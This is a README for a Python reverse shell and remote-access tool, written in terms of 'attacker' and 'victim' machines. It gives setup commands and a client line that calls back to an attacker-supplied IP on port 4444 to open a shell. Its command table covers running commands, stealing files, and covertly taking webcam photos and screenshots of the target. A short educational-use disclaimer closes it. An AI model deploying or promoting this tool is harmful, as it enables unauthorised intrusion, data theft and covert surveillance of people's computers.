

---

# 🐚 Python Reverse Shell

A fully functional reverse shell written in Python that allows remote command execution, file transfer, webcam capture, screen capture, and system information retrieval from the target machine.

---

## 📌 Features

* 🖥️ **Remote Shell Access** – Execute terminal commands on the victim's machine.
* 📁 **File Upload/Download** – Send and retrieve files from the target.
* 📸 **Webcam Capture** – Snap a photo using the target's webcam.
* 🖼️ **Screenshot Capture** – Take a screenshot of the target screen.
* 💻 **System Information** – Collect host OS, CPU, RAM, and other hardware info.

---

## 🧠 How It Works

This tool is divided into two main parts:

1. **Client (Victim-side)** – Connects to the attacker's machine and waits for commands.
2. **Server (Attacker-side)** – Listens for incoming connections and sends commands.

Once the client connects, the attacker can execute commands and perform actions like downloading files or accessing the webcam.

---

## 🧰 Requirements

* Python 3.x
* Required Libraries:

  ```bash
  pip install opencv-python psutil pillow
  ```

> 📌 **Note:** `ImageGrab` only works on Windows systems or macOS (with GUI).

---

## 🛠️ Setup

### ✅ Server (Attacker's Machine)

```bash
python server.py
```

### 🧬 Client (Victim's Machine)

Edit the IP address in the client script (`client.py`) to match the attacker's IP:

```python
server('YOUR-IP-ADDRESS', 4444)
```

Then run:

```bash
python client.py
```

> The client will keep trying to reconnect until the server is available.

---

## 💻 Available Commands

| Command           | Description                                          |
| ----------------- | ---------------------------------------------------- |
| `cd <path>`       | Change current directory on the victim machine       |
| `download <file>` | Download file from victim                            |
| `upload <file>`   | Upload file to victim                                |
| `camera`          | Capture a snapshot using the victim’s webcam         |
| `screenshot`      | Capture a screenshot of the victim's screen          |
| `sysinfo`         | Get system hardware and OS details                   |
| `exit`            | Close the connection                                 |
| Any other command | Executes on the victim’s terminal and returns output |

---

## ⚠️ Disclaimer

This tool is developed for **educational purposes only**. Unauthorized access to systems without explicit permission is illegal. Use this project only in test environments or with proper authorization.

---

## 📄 License

This project is open-source and available under the [MIT License](LICENSE).

---
